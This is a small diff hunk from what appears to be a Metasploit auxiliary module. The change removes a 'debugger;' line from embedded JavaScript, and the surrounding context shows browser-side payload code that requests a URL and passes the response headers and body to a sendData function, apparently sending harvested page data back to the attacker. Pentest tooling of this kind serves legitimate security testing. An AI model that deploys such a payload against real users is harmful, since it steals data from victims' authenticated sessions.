@@ -555,7 +555,6 @@ class Metasploit3 < Msf::Auxiliary
           req.open('GET', '#{url}', true);
           req.onreadystatechange = function() {
             if (req.readyState==4 && !sent) {
-              debugger;
               sendData('#{url}', {
                 response_headers: req.getAllResponseHeaders(),
                 response_body: req.responseText
